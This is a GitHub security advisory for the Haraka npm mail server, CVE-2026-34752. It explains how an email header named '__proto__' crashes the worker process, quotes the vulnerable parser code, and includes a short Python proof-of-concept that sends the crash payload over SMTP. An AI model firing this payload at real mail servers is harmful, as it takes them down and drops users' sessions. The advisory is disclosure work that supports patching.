# [H] Haraka affected by DoS via `__proto__` email header

## Summary
Severity: High
Advisory: GHSA-xph3-r2jf-4vp3
CVE: CVE-2026-34752
CWE: CWE-248
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-xph3-r2jf-4vp3
Type: github-advisory

## Affected
- npm: `Haraka` — affected >=0 <3.1.4

## Details
### Summary

Sending an email with `__proto__:` as a header name crashes the Haraka worker process. 

### Details

The header parser at `node_modules/haraka-email-message/lib/header.js:215-218` stores headers in a plain `{}` object:

```javascript
_add_header(key, value, method) {
    this.headers[key] ??= []          // line 216
    this.headers[key][method](value)  // line 217
}
```

When `key` is `__proto__`:
1. `this.headers['__proto__']` returns `Object.prototype` (the prototype getter)
2. `Object.prototype` is not null/undefined, so `??=` is skipped
3. `Object.prototype.push(value)` throws `TypeError: not a function`

The TypeError reaches the global `uncaughtException` handler at `haraka.js:26-33`, which calls `process.exit(1)`:

```js
process.on('uncaughtException', (err) => {
    if (err.stack) {
        err.stack.split('\n').forEach((line) => logger.crit(line))
    } else {
        logger.crit(`Caught exception: ${JSON.stringify(err)}`)
    }
    logger.dump_and_exit(1)
})
```

### PoC

```python
import socket, time

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(5)
sock.connect(("127.0.0.1", 2525))
sock.recv(4096)
sock.sendall(b"EHLO evil\r\n"); sock.recv(4096)
sock.sendall(b"MAIL FROM:<x@x.com>\r\n"); sock.recv(4096)
sock.sendall(b"RCPT TO:<user@haraka.local>\r\n"); sock.recv(4096)
sock.sendall(b"DATA\r\n"); sock.recv(4096)
# Crash payload
sock.sendall(b"From: x@x.com\r\n__proto__: crash\r\n\r\nbody\r\n.\r\n")
```

### Impact

In single-process mode (`nodes=0`), the entire server goes down. In cluster mode, the master restarts the worker, but all sessions are lost.

## References
- https://github.com/haraka/Haraka/security/advisories/GHSA-xph3-r2jf-4vp3
- https://nvd.nist.gov/vuln/detail/CVE-2026-34752
- https://github.com/haraka/Haraka
- https://github.com/haraka/Haraka/releases/tag/v3.1.4
